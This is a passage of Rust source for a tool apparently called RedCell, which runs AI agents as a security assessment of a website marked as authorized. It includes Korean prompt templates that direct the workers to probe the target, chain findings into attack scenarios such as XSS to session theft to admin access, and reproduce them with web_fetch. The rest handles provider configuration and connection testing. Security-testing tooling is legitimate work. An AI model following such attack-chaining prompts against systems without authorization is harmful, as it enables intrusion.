(발견마다 한 줄, 최대 12줄. 발견이 없으면 "- [정보] 이상 없음 — <확인한 범위>" 한 줄)"#,
        label = def.label,
        title = def.title,
        target = target,
        https_hint = https_hint,
        goal = if goal.trim().is_empty() { "(설명 없음 — 실측으로 파악)" } else { goal.trim() },
        brief = def.brief,
        mem = mem,
    )
}

/// 심층 진단 collector(병합자)용 지시문 — 워커 발견을 시나리오 리포트로 fan-in.
fn deep_merge_instruction(target: &str, goal: &str, outputs: &str, mem: &str) -> String {
    format!(
        r#"{DIAG_ROLE}

당신은 심층 진단의 최종 리포트 작성자(collector)다. 5명의 분야별 워커가 같은
대상을 동시에 진단한 결과(아래)가 주어졌다. 이를 병합·검증해 최종 리포트 1개를
작성한다.

대상 사이트(인가됨): {target}

## 서비스 설명

{goal}

## 워커 발견 (5개 분야 — 중복 제거하고 병합할 것)

{outputs}
{mem}
## 병합 규칙
1. 중복 발견은 하나로 합치고, 서로 연결되는 발견은 체인 시나리오(XSS→세션 탈취→
   관리자 권한 등)로 엮는다 — 단일 발견 나열이 아니라 **공격 시나리오**가 주인공이다.
2. 위험도 높음/치명 후보는 web_fetch 로 비파괴 재현을 시도해 [실증]/[징후]로
   확정한다. 재현 못 하면 [가정]으로 정직하게 둔다.
3. 워커가 놓친 분야(비즈니스 로직 조합 등)가 보이면 1~2개 시나리오를 보강한다.
4. 아래 리포트 형식·집필 원칙을 정확히 지킨다.

{REPORT_SPEC}"#,
        target = target,
        goal = if goal.trim().is_empty() { "(설명 없음 — 워커 실측 기반)" } else { goal.trim() },
        outputs = outputs,
        mem = mem,
    )
}

/// 심층 진단 추적 라운드 상한 (1차 + 추적 2회 = 최대 3라운드, 결정적 수렴).
const DEEP_MAX_ROUNDS: u32 = 3;
/// 추적 지시문에 넣는 자가 이전 결과 발췌 상한 (문자).
const DEEP_FOLLOWUP_TRUNC: usize = 2000;

/// 워커 출력에서 발견 키 추출 — `[등급] 제목` 줄을 정규화해 순서 유지 중복 제거.
/// 수렴 판정(신규 발견 수) + 교차 단서 전달에 쓴다.
fn extract_finding_keys(text: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for line in text.lines() {
        let t = line.trim();
        if t.is_empty() {
            continue;
        }
        let is_bullet = t.starts_with("- [")
            || t.starts_with("* [")
            || t.contains("[치명]")
            || t.contains("[높음]")
            || t.contains("[중간]")
            || t.contains("[낮음]")
            || (t.starts_with("## ") && !t.contains("워커 발견"));
        if !is_bullet {
            continue;
        }
        let norm: String = t
            .to_lowercase()
            .chars()
            .filter(|c| !c.is_whitespace() && !matches!(c, '-' | '#' | '*' | '/' | ':' | '(' | ')'))
            .take(80)
            .collect();
        if norm.chars().count() >= 8 && !out.contains(&norm) {
            out.push(norm);
        }
    }
    out
}

/// 추적 라운드 지시문 — 자가 이전 결과 + 타 워커 단서를 물고 추가 발견만 노린다.
fn deep_followup_instruction(
    def: &DeepWorkerDef,
    round: u32,
    own_prior: &str,
    cross: &str,
    target: &str,
) -> String {
    let own: String = own_prior.chars().take(DEEP_FOLLOWUP_TRUNC).collect();
    format!(
        r###"# RedCell 심층 진단 추적 라운드 {round} — {label} ({title})

너는 같은 대상을 계속 파고 있는 '{title}' 담당 전문가다. 이전 턴의 대화·P0 증거는
그대로 이어진다. 새로 실측·추론해서 **추가 발견만** 보고한다. 이미 보고한 것은
반복하지 마라.

대상 사이트(인가됨): {target}

## 네 이전 보고 (요약 — 반복 금지)
{own}

## 다른 워커의 단서 (네 분야와 엮일 수 있음)
{cross}

## 추적 규칙
- 위 단서 중 네 분야와 연결되는 것을 우선 추적하고, 네 이전 보고의 [가정] 은
  web_fetch 비파괴 재현으로 [실증]/[징후] 승격을 시도한다.
- 그래도 새 게 없으면 "- [정보] 추가 발견 없음 — <확인한 범위>" 한 줄만.
- 출력 형식: "## 추가 발견 ({label})" + 발견마다 "- [등급] 제목 — 설명 / 근거: …"
  (최대 8줄)"###,
        round = round,
        label = def.label,
        title = def.title,
        target = target,
        own = if own.trim().is_empty() { "(이전 보고 없음)" } else { own.trim() },
        cross = if cross.trim().is_empty() { "(단서 없음)" } else { cross.trim() },
    )
}

/// 프로바이더 목록 + 자격증명 감지 상태(프론트 연동용).
#[tauri::command]
fn get_providers() -> Value {
    Value::Array(
        PROVIDER_CATALOG
            .iter()
            .map(|p| {
                let ready_env = p.env_keys.iter().any(|k| {
                    std::env::var(k).map(|v| !v.trim().is_empty()).unwrap_or(false)
                });
                json!({
                    "name": p.name,
                    "kind": p.kind,
                    "note": p.note,
                    "default_model": p.default_model,
                    "base_url": p.base_url,
                    "env_keys": p.env_keys,
                    "ready_env": ready_env,
                    "needs_base": p.needs_base,
                })
            })
            .collect(),
    )
}

/// 저장된 연결 정보를 자식 프로세스(pi) 환경변수로 주입한다.
/// pi 는 환경변수(REDCELL_* 는 무시한다!) 대신 자체 규칙으로 자격증명을 읽는다:
///   1순위 CLI --api-key → 2순위 ~/.pi/agent/auth.json → 3순위 표준 env(ANTHROPIC_API_KEY 등)
/// 그래서 키는 (a) 표준 env 주입 + (b) --api-key CLI 인자 두 경로로 넘긴다.
fn inject_provider_env(cmd: &mut Command, provider: &str, conn: &ProviderConn) {
    if let Some(p) = PROVIDER_CATALOG.iter().find(|p| p.name == provider) {
        // `!명령` 키는 주입하지 않는다 — 명령 문자열 자체를 키로 쓰는 셈이 된다.
        if !conn.api_key.trim().is_empty() && !conn.api_key.trim_start().starts_with('!') {
            if let Some(k) = p.env_keys.last() {
                // 마지막 env 슬롯에 주입(앞쪽 OAUTH 등 실제 설정 env 가 있으면 그게 우선)
                cmd.env(k, conn.api_key.trim());
            }
        }
    }
}

/// pi 의 커스텀 프로바이더(baseUrl 기반)는 `~/.pi/agent/models.json` 에만 선언할 수 있다.
/// (docs/models-configuration.md: custom providers) 프로바이더 "custom"/"ollama" 는
/// baseUrl·apiKey·models 를 여기에 기록해야 pi 가 프로바이더로 인식하고 키 없음 오류가 나지 않는다.
/// 사용자의 기존 파일(다른 프로바이더·이름 등)은 보존하고 같은 이름만 병합(upsert)한다.
/// `api` 가 비어 있으면 기존 api 를 유지(없으면 openai-completions)하고, 지정됐으면
/// 그 방언으로 덮어쓴다. anthropic-messages (Databricks AI Gateway 등) 일 때는 게이트웨이가
/// 요구하는 authHeader·compat 를 함께 기록하고, OpenAI 방언으로 돌아오면 제거한다.
/// apiKey 가 `!명령` 형태(pi 의 !command)면 그대로 기록한다 — pi 가 요청마다 실행해
/// 토큰을 받아오므로 만료되는 키를 파일에 박지 않아도 된다 (`ug auth-token ...` 용).
/// models.json 은 심층 진단의 5개 워커 스레드가 동시에 갱신할 수 있다 —
/// read-modify-write 가 겹치면 엔트리가 사라지거나 반쯤 쓰인 파일이 남으므로 직렬화한다.
static MODELS_JSON_LOCK: Mutex<()> = Mutex::new(());

/// pi 가 기본 카탈로그에 없는 프로바이더 — 실행 전 models.json 병합이 필요하다.
fn needs_models_json_sync(provider: &str) -> bool {
    matches!(provider, "custom" | "ollama" | "lge-aigw")
}

/// 프로바이더별 기본 API 방언 — 앱 설정(api)이 비었을 때 쓴다.
fn provider_default_api(provider: &str) -> &'static str {
    match provider {
        // LGE AIGW 는 MLflow Responses API 다 (OpenAI Responses 방언).
        "lge-aigw" => "openai-responses",
        _ => "",
    }
}

/// 동기화에 쓸 base URL — 앱 설정이 비었으면 카탈로그 기본값(lge-aigw 등 내장 연결).
fn sync_base_url(provider: &str, conn: &ProviderConn) -> String {
    if !conn.base_url.trim().is_empty() {
        return conn.base_url.trim().to_string();
    }
    PROVIDER_CATALOG
        .iter()
        .find(|p| p.name == provider)
        .map(|p| p.base_url.to_string())
        .unwrap_or_default()
}

/// 동기화에 쓸 API 방언 — 앱 설정이 비었으면 프로바이더 기본값.
fn sync_api(provider: &str, conn: &ProviderConn) -> String {
    if !conn.api.trim().is_empty() {
        return conn.api.trim().to_string();
    }
    provider_default_api(provider).to_string()
}

fn sync_pi_models_json_at(path: &Path, provider: &str, base_url: &str, api_key: &str, model: &str, api: &str) -> Result<(), String> {
    let _guard = MODELS_JSON_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    let mut root: Value = fs::read_to_string(path)
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_else(|| json!({ "providers": {} }));
    if root.get("providers").is_none() {
        root["providers"] = json!({});
    }
    let existing = root["providers"].get(provider).cloned().unwrap_or_else(|| json!({}));
    let mut prov: serde_json::Map<String, Value> = existing.as_object().cloned().unwrap_or_default();
    if !base_url.trim().is_empty() {
        prov.insert("baseUrl".into(), Value::String(base_url.trim().to_string()));
    }
    if !api.trim().is_empty() {
        prov.insert("api".into(), Value::String(api.trim().to_string()));
    } else if prov.get("api").is_none() {
        prov.insert("api".into(), Value::String("openai-completions".into()));
    }
    let anthropic = prov.get("api").and_then(|v| v.as_str()) == Some("anthropic-messages");
    if anthropic {
        // Databricks AI Gateway 의 Anthropic 경로: Bearer 인증 + per-tool
        // eager_input_streaming 미지원이므로 레거시 beta 헤더 경로를 쓴다 (ug 와 동일).
        prov.insert("authHeader".into(), Value::Bool(true));
        let mut compat = prov.get("compat").and_then(|v| v.as_object()).cloned().unwrap_or_default();
        compat.insert("supportsEagerToolInputStreaming".into(), Value::Bool(false));
        if provider == "lge-aigw" {
            // AIGW GLM 은 thinking 블록에 빈 signature 를 돌려준다 — 그대로 재생한다.
            compat.insert("allowEmptySignature".into(), Value::Bool(true));
        }
        prov.insert("compat".into(), Value::Object(compat));
    } else {
        // 게이트웨이 전용 필드만 걷어내고 사용자가 쓴 compat 은 보존한다.
        prov.remove("authHeader");
        if let Some(compat) = prov.get_mut("compat").and_then(|v| v.as_object_mut()) {
            compat.remove("supportsEagerToolInputStreaming");
        }
        // 보수적 OpenAI 호환 기본값 — pi 는 기본으로 stream_options.include_usage 를
        // 보내는데, 이를 모르는 엔드포인트(구버전 vLLM·사내 프록시·ollama 구버전)는
        // 이 필드 하나로 400 을 돌려준다. store·developer 역할도 알 수 없는
        // 엔드포인트엔 끄고 시작한다 — 사용자가 직접 쓴 compat 값은 존중한다.
        // pi 의 openai-responses 클라이언트는 기본으로 HTTP 사양 밖의 `session_id`
        // (밑줄 포함) 헤더를 보내 세션 어피니티를 챙기는데, strict 프록시·게이트웨이는
        // 이를 본문 없는 400 으로 거부하는 게 알려진 pi 이슈(#3579)라 기본으로 끈다.
        let mut compat = prov.get("compat").and_then(|v| v.as_object()).cloned().unwrap_or_default();
        for (k, v) in [
            ("supportsUsageInStreaming", json!(false)),
            ("supportsStore", json!(false)),
            ("supportsDeveloperRole", json!(false)),
            ("sessionAffinityFormat", json!("openai-nosession")), // 신버전 pi
            ("sendSessionIdHeader", json!(false)),                // 구버전 pi
        ] {
            compat.entry(k.to_string()).or_insert(v);
        }
        prov.insert("compat".into(), Value::Object(compat));
    }
    // apiKey 는 반드시 비어있지 않은 문자열로 남긴다 — pi 는 빈 apiKey 가 있으면
    // 프로바이더 자체를 목록에서 내려버리므로, 미설정이면 placeholder 를 쓴다
    // (키 없는 로컬 서버는 헤더를 무시하므로 문제없고, 실제 키는 --api-key 로 우선 주입).
    prov.insert(
        "apiKey".into(),
        Value::String(if api_key.trim().is_empty() {
            "redcell-placeholder".to_string()
        } else {
            api_key.trim().to_string()
        }),
    );
    // models 목록 upsert (지정한 모델 id 가 없으면 추가, 기존 목록 보존).
    let mut models: Vec<Value> = prov
        .get("models")
        .and_then(|m| m.as_array())
        .cloned()
        .unwrap_or_default();
    if !model.trim().is_empty() {
        let id = model.trim().to_string();
        let exists = models.iter().any(|m| m.get("id").and_then(|i| i.as_str()) == Some(id.as_str()));
        if !exists {
            let mut entry = json!({ "id": id });
            if provider == "lge-aigw" {
                // thinking 이 max_tokens 를 먼저 쓴다 — 상한·컨텍스트를 명시해
                // "thinking 만 하고 답이 잘리는" 현상을 막는다.
                entry["reasoning"] = json!(true);
                entry["contextWindow"] = json!(200000);
                entry["maxTokens"] = json!(16384);
            }
            models.push(entry);
        }
    }
    if models.is_empty() {
        return Err(format!(
            "프로바이더 '{provider}' 에 모델이 지정되지 않았습니다 — ⚙ 설정 > 모델 연결 에서 모델명을 입력하세요."
        ));
    }
    prov.insert("models".into(), Value::Array(models));
    root["providers"][provider] = Value::Object(prov);
    if let Some(dir) = path.parent() {
        fs::create_dir_all(dir).map_err(|e| format!("pi 설정 디렉터리 생성 실패: {e}"))?;
    }
    let mut text = serde_json::to_string_pretty(&root).map_err(|e| e.to_string())?;
    text.push('\n');
    fs::write(path, &text).map_err(|e| format!("models.json 기록 실패: {e}"))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(path, fs::Permissions::from_mode(0o600));
    }
    Ok(())
}

/// 프라이빗 설정 경로: pi 는 ~/.pi(Windows: %USERPROFILE%\.pi) 를 사용한다.
fn pi_models_json_path() -> Result<PathBuf, String> {
    user_home()
        .map(|h| h.join(".pi").join("agent").join("models.json"))
        .ok_or_else(|| "홈 디렉터리(HOME/USERPROFILE)를 찾을 수 없습니다.".to_string())
}

/// `!명령` 키(pi !command) 해석 — 연결 테스트용으로 한 번만 실행해 토큰을 받아온다.
/// (`ug auth-token ...` 처럼 요청마다 새 토큰을 만드는 명령을 카드에 넣었을 때,
/// 테스트에서도 같은 경로로 토큰을 구한다. 최대 10초.)
fn resolve_bang_key(key: &str) -> Result<String, String> {
    let cmdline = key.trim_start().strip_prefix('!').unwrap_or("").trim();
    if cmdline.is_empty() {
        return Err("`!` 뒤에 실행할 명령이 없습니다.".into());
    }
    let mut cmd = if cfg!(windows) {
        let comspec = std::env::var_os("COMSPEC").unwrap_or_else(|| "cmd.exe".into());
        let mut c = Command::new(comspec);
        c.arg("/C").arg(cmdline);
        c
    } else {
        let mut c = Command::new("sh");
        c.arg("-c").arg(cmdline);
        c
    };
    hide_window(&mut cmd);
    let mut child = cmd
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("키 명령 실행 실패: {e}"))?;
    use std::io::Read;
    let mut waited = 0;
    loop {
        if let Some(st) = child.try_wait().map_err(|e| e.to_string())? {
            let mut out = String::new();
            if let Some(mut o) = child.stdout.take() {
                let _ = o.read_to_string(&mut out);
            }
            let tok = out.trim().to_string();
            if st.success() && !tok.is_empty() {
                // pi 와 동일하게 stdout 전체(trim)를 토큰으로 쓴다.
                return Ok(tok);
            }
            let mut err = String::new();
            if let Some(mut o) = child.stderr.take() {
                let _ = o.read_to_string(&mut err);
            }
            let detail = if tok.is_empty() { err.trim().to_string() } else { tok };
            return Err(format!("키 명령이 토큰을 내놓지 않았습니다{}.", if detail.is_empty() { String::new() } else { format!(": {detail}") }));
        }
        std::thread::sleep(std::time::Duration::from_millis(150));
        waited += 150;
        if waited > 10000 {
            let _ = child.kill();
            return Err("키 명령 시간 초과 (10초) — `ug auth-token ...` 인증 상태를 확인하세요.".into());
        }
    }
}

/// 연결 테스트 — node fetch 로 대상 엔드포인트 도달성/키 인증을 확인한다.
/// (reqwest 의존성 추가 없이 이미 있는 node 를 재사용)
/// 방언별로 실제 1회 생성 호출을 날려 키·모델·방언을 함께 검증한다:
/// anthropic-messages → POST {base}/v1/messages, openai-responses → POST {base}/responses,
/// openai-completions → POST {base}/chat/completions. 실검증 로직은
/// probe_provider_endpoint — 핑 실패 원인 분류(classify_ping_failure)도 같은 경로를 쓴다.
#[tauri::command]
fn test_provider(provider: String, api_key: String, base_url: String, api: Option<String>, model: Option<String>) -> Result<String, String> {
    let meta = PROVIDER_CATALOG
        .iter()
        .find(|p| p.name == provider)
        .ok_or("알 수 없는 프로바이더")?;
    let base = if base_url.trim().is_empty() {
        meta.base_url.to_string()
    } else {
        base_url.trim().to_string()
    };
    if base.is_empty() {
        return Err("base URL 을 입력하세요 (custom/ollama 는 필수).".into());
    }
    let key = if api_key.trim_start().starts_with('!') {
        resolve_bang_key(&api_key)?
    } else {
        api_key.trim().to_string()
    };
    // 카드에서 명시한 방식이 없으면 프로바이더 기본 방언을 따른다 (lge-aigw = responses).
    let effective_api = if api.as_deref().unwrap_or("").is_empty() {
        provider_default_api(&provider).to_string()
    } else {
        api.unwrap_or_default()
    };
    probe_provider_endpoint(&provider, &key, &base, &effective_api, model.as_deref().unwrap_or(""))
}

/// 실제 1회 생성 호출로 엔드포인트·키·모델·방언을 검증한다 (연결 테스트와
/// 핑 실패 원인 분류가 같은 경로를 쓴다 — 결과가 어긋나면 안 되므로).
/// Ok(한 줄 요약) | Err(상세) 형태. Anthropic 방언은 x-api-key·anthropic-version,
/// 나머지는 Authorization Bearer 만 쓴다.
fn probe_provider_endpoint(provider: &str, key: &str, base: &str, effective_api: &str, model: &str) -> Result<String, String> {
    let anthropic = effective_api == "anthropic-messages";
    let responses = effective_api == "openai-responses";
    let m = model.trim();
    let (url, body, anthropic_headers) = if anthropic {
        if m.is_empty() {
            return Err("Anthropic 방식 테스트는 모델명이 필요합니다 — 모델란에 입력하세요.".into());
        }
        let payload = serde_json::to_string(&json!({
            "model": m,
            "max_tokens": 1,
            "messages": [{ "role": "user", "content": "ok" }],
        }))
        .unwrap_or_default();
        (format!("{}/v1/messages", base.trim_end_matches('/')), Some(payload), true)
    } else if responses {
        if m.is_empty() {
            return Err("Responses 방식 테스트는 모델명이 필요합니다 — 모델란에 입력하세요.".into());
        }
        // OpenAI Responses 방언 — Databricks MLflow 게이트웨이 등.
        let payload = serde_json::to_string(&json!({
            "model": m,
            "max_output_tokens": 16,
            "input": [{ "role": "user", "content": [{ "type": "input_text", "text": "ok" }] }],
        }))
        .unwrap_or_default();
        (format!("{}/responses", base.trim_end_matches('/')), Some(payload), false)
    } else if provider != "ollama" && !m.is_empty() {
        // 모델이 지정됐으면 실제 1토큰 생성 호출로 검증한다 — GET 도달성만으로는
        // 잡히지 않는 400(모델명 오류·필드 거부·방언 불일치)까지 잡아낸다.
        let payload = serde_json::to_string(&json!({
            "model": m,
            "max_tokens": 1,
            "messages": [{ "role": "user", "content": "ok" }],
        }))
        .unwrap_or_default();
        (format!("{}/chat/completions", base.trim_end_matches('/')), Some(payload), false)
    } else {
        let path = if provider == "ollama" { "/tags" } else { "/models" };
        (format!("{}{}", base.trim_end_matches('/'), path), None, false)
    };
    // POST 는 키·모델 실검증(2xx 일 때만 OK), GET 은 도달성 프로브(응답만 오면 OK —
    // /models 없는 서버도 있음). Anthropic 방언만 x-api-key·anthropic-version 을 쓴다.
    let script = if body.is_some() {
        r#"(async()=>{const u=process.env.RC_TEST_URL,k=process.env.RC_TEST_KEY||"",b=JSON.parse(process.env.RC_TEST_BODY||"null"),ah=process.env.RC_TEST_ANTHROPIC==="1";const h={"content-type":"application/json"};if(k){h.Authorization="Bearer "+k;if(ah)h["x-api-key"]=k;}if(ah)h["anthropic-version"]="2023-06-01";try{const r=await fetch(u,{method:"POST",headers:h,body:JSON.stringify(b)});const t=await r.text();console.log((r.ok?"OK ":"ERR ")+r.status+" "+r.statusText+" "+t.slice(0,300))}catch(e){console.log("ERR "+String(e&&e.message||e))}})()"#
    } else {
        r#"(async()=>{const u=process.env.RC_TEST_URL,k=process.env.RC_TEST_KEY||"";try{const r=await fetch(u,{headers:k?{Authorization:"Bearer "+k,"x-api-key":k,"anthropic-version":"2023-06-01"}:{}});console.log("OK "+r.status+" "+r.statusText)}catch(e){console.log("ERR "+String(e&&e.message||e))}})()"#
    };
    let mut probe = Command::new("node");
    probe
        .arg("-e")
        .arg(script)
        .env("RC_TEST_URL", url)
        .env("RC_TEST_KEY", &key)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    if anthropic_headers {
        probe.env("RC_TEST_ANTHROPIC", "1");
    }
    if let Some(b) = body {
        probe.env("RC_TEST_BODY", b);
    }
    hide_window(&mut probe);
    let mut child = probe
        .spawn()
        .map_err(|e| format!("node 실행 실패: {e}"))?;
    use std::io::Read;
    // 최대 6초 대기
    let mut waited = 0;
    loop {
        if let Some(st) = child.try_wait().map_err(|e| e.to_string())? {
            if st.success() {
                let mut out = String::new();
                if let Some(mut o) = child.stdout.take() {
                    let _ = o.read_to_string(&mut out);
                }
                let line = out.lines().next().unwrap_or("").trim().to_string();
                return if line.starts_with("OK") { Ok(line) } else { Err(out.trim().to_string()) };
            }
            let mut err = String::new();
            let mut out = String::new();
            if let Some(mut o) = child.stderr.take() {
                let _ = o.read_to_string(&mut err);
            }
            if let Some(mut o) = child.stdout.take() {
                let _ = o.read_to_string(&mut out);
            }
            return Err(format!("{err} {out}").trim().to_string());
        }
        std::thread::sleep(std::time::Duration::from_millis(150));
        waited += 150;
        if waited > 6000 {
            let _ = child.kill();
            return Err("연결 시간 초과 (6초) — base URL/네트워크를 확인하세요.".into());
        }
    }
}

/// 세션 실행 — redcell CLI 를 --ndjson 으로 스폰하고 이벤트를 스트리밍한다.
/// 즉시 반환하며, 진행은 `engagement-event` / `engagement-status` 이벤트로 전달된다.
// ── redcell CLI 실행 ─────────────────────────────────────────────────────────
/// Windows 콘솔 창이 떴다 사라지는 현상 방지: 자식 프로세스에 CREATE_NO_WINDOW 를 준다.
fn hide_window(cmd: &mut Command) {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
    }
    #[cfg(not(windows))]
    {
        let _ = cmd; // 비 Windows 에서는 무연산
    }
}

/// redcell CLI 를 실행할 프로세스를 구성한다.
/// Windows 에서는 두 가지 문제를 피해야 한다:
///  1) `npx`/`.cmd` 배치 파일은 CreateProcess 로 직접 실행 불가
///  2) tsx CLI(cli.mjs)는 내부에서 자식 node 를 다시 띄우는데(cross-spawn +
///     `--require C:\...` 절대경로), Windows 에서 경로 해석이 꼬여 EISDIR 오류를
///     내고, 부모만 kill 되면 엔진 자식이 고아로 남아 "중지"가 먹지 않는다.
/// 따라서 node.exe + `--import tsx`(공식 지원, node ≥ 20.6)로 엔진을
/// **단일 프로세스**로 직접 실행한다. `--import tsx` 는 cwd 기준으로 해석된다.

/** prime-agent(pi) CLI 위치 탐색 — Windows .cmd 전환 문제 회피를 위해 dist/cli.js 를 직접 node 로. */
/// 사용자 홈 디렉터리(Windows: USERPROFILE, 그 외 HOME).
fn user_home() -> Option<PathBuf> {
    for k in ["HOME", "USERPROFILE"] {
        if let Some(h) = std::env::var_os(k) {
            let b = PathBuf::from(h);
            if !b.as_os_str().is_empty() {
                return Some(b);
            }
        }
    }
    None
}

/// PATH 에서 실행 파일을 찾는다. Windows 는 .exe/.cmd/.bat 확장자까지 확인한다
/// (Rust 의 is_file 은 PATHEXT 를 해석하지 않으므로 반드시 직접 붙여봐야 한다 — 이게
/// "PATH 포함 node: 없음" 으로 잘못 뜨던 원인).
fn first_on_path(bin: &str) -> Option<PathBuf> {
    let path = std::env::var_os("PATH")?;
    let exts: &[&str] = if cfg!(windows) { &["", ".exe", ".cmd", ".bat"] } else { &[""] };
    for dir in std::env::split_paths(&path) {
        for ext in exts {
            let p = dir.join(format!("{bin}{ext}"));
            if p.is_file() {
                return Some(p);
            }
        }
    }
    None
}

/// `npm root -g` 실행(전역 node_modules 실제 위치). Windows 는 npm.cmd 를 cmd /C 로 호출.
fn npm_global_root() -> Option<String> {
    let npm = if cfg!(windows) { "npm.cmd" } else { "npm" };
    let npm_exe = first_on_path(npm)?;
    let result = if cfg!(windows) {
        let comspec = std::env::var_os("COMSPEC").unwrap_or_else(|| "cmd.exe".into());
        Command::new(comspec)
            .arg("/C")
            .arg(&npm_exe)
            .args(["root", "-g"])
            .output()
    } else {
        Command::new(&npm_exe).args(["root", "-g"]).output()
    };
    result.ok().and_then(|o| {
        let s = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if s.is_empty() { None } else { Some(s) }
    })
}

/// pi CLI(prime-agent) 경로 탐색 후보 목록. 우선순위:
///   1) REDCELL_PI_DIR / PI_PACKAGE_DIR 환경변수
///   2) redcell_dir/node_modules (로컬 설치)
///   3) APPDATA\npm (Windows), nvm(NVM_DIR·$HOME/.nvm·%APPDATA%\nvm),
///      pnpm($HOME/.local/share/pnpm·%LOCALAPPDATA%\pnpm), bun(~/.bun/install/global),
///      시스템 위치(/usr·/usr/local·/opt/homebrew·C:\Program Files\nodejs)
///   4) PATH 위의 `pi`/`pi.cmd`/`pi.exe` 실행파일(심볼릭 링크 해석)
///   5) `npm root -g`(PATH 위 node 옆 npm, 또는 표준 설치 위치)
fn prime_cli_candidates(redcell_dir: &str) -> Vec<PathBuf> {
    let mut cands: Vec<PathBuf> = Vec::new();
    // 1) 환경변수 직접 지정.
    for envk in ["REDCELL_PI_DIR", "PI_PACKAGE_DIR"] {
        if let Some(d) = std::env::var_os(envk) {
            let b = PathBuf::from(d);
            cands.push(b.join("dist").join("cli.js"));
            cands.push(b.join("cli.js"));
        }
    }
    // 2) 프로젝트 로컬 설치.
    cands.push(
        PathBuf::from(redcell_dir)
            .join("node_modules")
            .join("@earendil-works")
            .join("pi-coding-agent")
            .join("dist")
            .join("cli.js"),
    );
    // 3-0) APPDATA\npm (Windows npm 전역 기본 프리픽스).
    if let Some(apd) = std::env::var_os("APPDATA") {
        cands.push(
            PathBuf::from(apd)
                .join("npm")
                .join("node_modules")
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    // 3-1) nvm: NVM_DIR / $HOME/.nvm/versions/node/<v>/lib/node_modules (POSIX)
    //       + %APPDATA%\nvm\<v>\node_modules, %NVM_SYMLINK% (Windows nvm-windows)
    for base in [
        std::env::var_os("NVM_DIR").map(PathBuf::from),
        user_home().map(|h| h.join(".nvm")),
        std::env::var_os("APPDATA").map(|a| PathBuf::from(a).join("nvm")),
        std::env::var_os("NVM_SYMLINK").map(PathBuf::from),
    ]
    .into_iter()
    .flatten()
    {
        // POSIX 레이아웃: <base>/versions/node/<v>/...
        let versions = base.join("versions").join("node");
        if let Ok(entries) = std::fs::read_dir(&versions) {
            for e in entries.flatten() {
                cands.push(
                    e.path()
                        .join("lib")
                        .join("node_modules")
                        .join("@earendil-works")
                        .join("pi-coding-agent")
                        .join("dist")
                        .join("cli.js"),
                );
            }
        }
        // Windows nvm 레이아웃: <base>/<v>/node_modules, 또는 <base>/node_modules(심볼릭 대상)
        if let Ok(entries) = std::fs::read_dir(&base) {
            for e in entries.flatten() {
                cands.push(
                    e.path()
                        .join("node_modules")
                        .join("@earendil-works")
                        .join("pi-coding-agent")
                        .join("dist")
                        .join("cli.js"),
                );
            }
        }
        cands.push(
            base.join("node_modules")
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    // 3-1b) 사용자 지정 npm prefix 흔한 위치 (%USERPROFILE%\npm-global, \.npm-global)
    if let Some(home) = user_home() {
        for sub in ["npm-global", ".npm-global"] {
            cands.push(
                home.join(sub)
                    .join("node_modules")
                    .join("@earendil-works")
                    .join("pi-coding-agent")
                    .join("dist")
                    .join("cli.js"),
            );
        }
    }
    // 3-2) pnpm: $HOME/.local/share/pnpm[/pnpm]/<v>/node_modules (POSIX),
    //       %LOCALAPPDATA%\pnpm\global\<v>\node_modules (Windows)
    let mut pnpm_bases: Vec<PathBuf> = Vec::new();
    if let Some(home) = user_home() {
        pnpm_bases.push(home.join(".local").join("share").join("pnpm"));
    }
    if let Some(la) = std::env::var_os("LOCALAPPDATA") {
        let la = PathBuf::from(la);
        pnpm_bases.push(la.join("pnpm").join("global"));
        pnpm_bases.push(la.join("pnpm"));
    }
    for base in pnpm_bases {
        if let Ok(entries) = std::fs::read_dir(&base) {
            for e in entries.flatten() {
                cands.push(
                    e.path()
                        .join("node_modules")
                        .join("@earendil-works")
                        .join("pi-coding-agent")
                        .join("dist")
                        .join("cli.js"),
                );
            }
        }
        // 디렉터리가 없어도 기본 레이아웃은 후보로 남긴다(진단에 표시).
        cands.push(
            base.join("node_modules")
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    // 3-3) bun: ~/.bun/install/global/node_modules
    if let Some(home) = user_home() {
        cands.push(
            home.join(".bun")
                .join("install")
                .join("global")
                .join("node_modules")
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    // 3-4) 표준 시스템 위치.
    for p in [
        "/usr/lib/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
        "/usr/local/lib/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
        "/opt/homebrew/lib/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
    ] {
        cands.push(PathBuf::from(p));
    }
    if let Some(pf) = std::env::var_os("ProgramFiles") {
        cands.push(
            PathBuf::from(pf)
                .join("nodejs")
                .join("node_modules")
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    if let Some(la) = std::env::var_os("LOCALAPPDATA") {
        cands.push(
            PathBuf::from(la)
                .join("Programs")
                .join("nodejs")
                .join("node_modules")
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    // 4) PATH 위의 pi 실행 shim → 실제 cli.js 로 해석(npm shim: pi.cmd → node cli.js).
    for bin in ["pi", "pi.cmd", "pi.exe"] {
        if let Some(p) = first_on_path(bin) {
            let canon = std::fs::canonicalize(&p).unwrap_or(p);
            let cs = canon.to_string_lossy().to_lowercase();
            if cs.ends_with("cli.js") {
                cands.push(canon.clone());
            } else {
                cands.push(canon.join("dist").join("cli.js"));
                if let Some(dir) = canon.parent() {
                    cands.push(dir.join("node_modules").join("@earendil-works").join("pi-coding-agent").join("dist").join("cli.js"));
                }
            }
        }
    }
    cands
}

